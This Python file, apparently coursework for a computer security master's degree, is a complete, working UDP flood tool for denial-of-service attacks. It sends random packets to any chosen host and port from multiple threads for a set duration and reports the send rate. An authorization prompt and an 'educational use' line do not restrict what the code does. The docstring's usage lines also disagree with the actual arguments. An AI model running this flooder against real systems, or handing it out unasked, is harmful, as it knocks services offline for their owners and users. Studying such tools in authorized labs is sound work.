#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Master's in Computer Security Engineering
Dynamic Programming Languages - UDP Flooder

Author: Martinho Caeiro (23917)

Description:
    Sends UDP packets to a target (UDP Flood attack).
    
Check your network interface with:
    sudo tcpdump -i eth0 udp

Usage:
    python3 udp_flooder.py [--target HOST] [--port PORT] [--duration SECONDS] [--threads N]

Example:
    python3 udp_flooder.py --target 192.168.1.1 --port 53 --duration 10
"""

import socket
import random
import sys
import argparse
import time
import threading
from datetime import datetime



# Section: Workers

def udp_flood_worker(target, port, packet_size, duration, packets_sent):
    """Worker thread that sends UDP packets to a target."""
    end_time = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = random.randbytes(packet_size)

    count = 0
    try:
        while time.time() < end_time:
            sock.sendto(packet, (target, port))
            count += 1
            if count % 1000 == 0:
                print(f"  {count:,} pacotes enviados para {target}:{port}")
    except socket.error as e:
        print(f"  Erro de socket: {e}")
    except KeyboardInterrupt:
        pass
    finally:
        sock.close()
    
    packets_sent.append(count)
    return count



# Section: Flood logic

def flood_target(target, port, packet_size, duration, num_threads):
    """Send UDP flood with multiple threads."""
    print(f"\nIniciando UDP Flood")
    print(f"   Alvo: {target}:{port}")
    print(f"   Tamanho do pacote: {packet_size} bytes")
    print(f"   Duração: {duration} segundos")
    print(f"   Threads: {num_threads}")
    print("-" * 60)

    packets_sent = []
    threads = []
    t_start = time.time()

    try:
        # Create threads
        for i in range(num_threads):
            t = threading.Thread(
                target=udp_flood_worker,
                args=(target, port, packet_size, duration, packets_sent)
            )
            t.daemon = True
            t.start()
            threads.append(t)

        # Wait for threads
        for t in threads:
            t.join()

    except KeyboardInterrupt:
        print("\nFlood interrompido pelo utilizador.")

    duration_real = time.time() - t_start
    total_packets = sum(packets_sent)
    pps = total_packets / duration_real if duration_real > 0 else 0

    print("\n" + "=" * 60)
    print("RELATÓRIO - UDP FLOOD")
    print("=" * 60)
    print(f"Alvo: {target}:{port}")
    print(f"Total de pacotes enviados: {total_packets:,}")
    print(f"Taxa de envio: {pps:,.0f} pps (pacotes por segundo)")
    print(f"Duração real: {duration_real:.2f}s")
    print("=" * 60)



# Section: CLI

def main():
    parser = argparse.ArgumentParser(
        description="UDP Flooder - Ataque de negação de serviço (DoS) via UDP",
        epilog="Apenas para fins educacionais em ambientes autorizados"
    )
    parser.add_argument("target", help="Alvo (IP ou hostname)")
    parser.add_argument("duration", type=int, help="Duração em segundos")
    parser.add_argument("--port", "-p", type=int, default=53, help="Porta UDP (default: 53)")
    parser.add_argument("--packet-size", "-s", type=int, default=1472, help="Tamanho do pacote em bytes (default: 1472)")
    parser.add_argument("--threads", "-n", type=int, default=4, help="Número de threads (default: 4)")

    try:
        args = parser.parse_args()
    except SystemExit:
        sys.exit(1)

    # Validations
    if args.port < 1 or args.port > 65535:
        print(f"Porta deve estar entre 1 e 65535")
        sys.exit(1)

    if args.duration < 1:
        print(f"Duração deve ser pelo menos 1 segundo")
        sys.exit(1)

    if args.packet_size < 1 or args.packet_size > 65535:
        print(f"Tamanho do pacote deve estar entre 1 e 65535 bytes")
        sys.exit(1)

    if args.threads < 1:
        print(f"Número de threads deve ser pelo menos 1")
        sys.exit(1)

    # Safety confirmation
    print("=" * 60)
    print("AVISO - ATAQUE UDP FLOOD")
    print("=" * 60)
    print(f"Está prestes a enviar um ataque DoS para: {args.target}:{args.port}")
    print(f"Duração: {args.duration}s | Threads: {args.threads}")
    print("Este ataque pode ser ILEGAL se não for autorizado.")
    print("-" * 60)
    
    confirm = input("Confirma que tem autorização? (s/N): ").strip().lower()
    if confirm != "s" and confirm != "yes":
        print("Operação cancelada.")
        sys.exit(0)

    # Resolve hostname if needed
    try:
        target_ip = socket.gethostbyname(args.target)
        print(f"Alvo resolvido: {args.target} -> {target_ip}")
    except socket.gaierror:
        print(f"Não foi possível resolver {args.target}")
        sys.exit(1)

    # Execute flood
    flood_target(target_ip, args.port, args.packet_size, args.duration, args.threads)


if __name__ == "__main__":
    main()